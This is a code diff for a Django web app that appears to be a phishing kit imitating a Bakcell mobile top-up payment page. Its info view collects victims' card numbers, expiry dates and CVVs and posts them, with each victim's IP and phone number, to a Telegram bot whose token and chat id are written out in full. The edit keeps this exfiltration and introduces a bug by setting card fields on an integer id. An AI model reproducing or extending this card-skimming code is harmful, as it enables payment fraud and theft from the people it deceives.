@@ -82,7 +82,8 @@ def bakcell(request):
         request.session['operator'] = operator
         request.session['phone'] = number
         request.session['amount'] = amount
-        return redirect('info')
+        request.session['contact_id'] = contact.id
+        return redirect('info',)
     return render(request, "pages/bakcell.html")
 
 
@@ -93,7 +94,8 @@ def info(request):
         if validate_card_number(cardnumber) == False:
             return render(request, "pages/3dsec.html")
         else:
-            last_contact = ContactModel.objects.latest('created_at')
+            contact_id = request.session.get('contact_id')
+            contact = ContactModel.objects.get(id=contact_id)
             mm_= request.POST.get("mm")
             yy_= request.POST.get("yy")
             cvv_= request.POST.get("cvv")
@@ -109,18 +111,17 @@ def info(request):
             elif len(cvv_) == 2:
                 error_msg = "CVV must be a 3-digit number."
                 return render(request, "pages/3dsec.html")
-            last_contact.cc = cardnumber
-            last_contact.mm = mm_
-            last_contact.yy = yy_
-            last_contact.cvv = cvv_
-            last_contact.bankname=""
-            last_contact.save()
-            random_sleep()
-            response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\n{last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
+            contact_id.cc = cardnumber
+            contact_id.mm = mm_
+            contact_id.yy = yy_
+            contact_id.cvv = cvv_
+            contact_id.bankname=""
+            contact_id.save()
+            response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact_id}\n{contact_id.ip}\n{contact_id.cc}|{contact_id.mm}|{contact_id.yy}|{contact_id.cvv}\n Operator: {contact_id.operator} \nNumber:{contact_id.phone}')
             context = {
-                    'id':last_contact.id
+                    'id':contact_id.id
                 }
-            return render(request, 'pages/master.html', {'last_contact_id': last_contact.id})
+            return render(request, 'pages/master.html', {'last_contact_id': contact_id.id})
     operator = request.session.get('operator')
     phone = request.session.get('phone')
     amount = request.session.get('amount')
@@ -138,9 +139,7 @@ def check_approval_status(request, contact_id):
         return JsonResponse({'bankname': contact.bankname})
     except ContactModel.DoesNotExist:
         return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)
-    
-def random_sleep():
-    interval = random.randint(400, 1023) / 1000  
+
 def validate_card_number(card_number):
     regex = r'^[456]\d{3}-?\d{4}-?\d{4}-?\d{4}|^[456]\d{15}$'
     if re.match(regex, card_number):
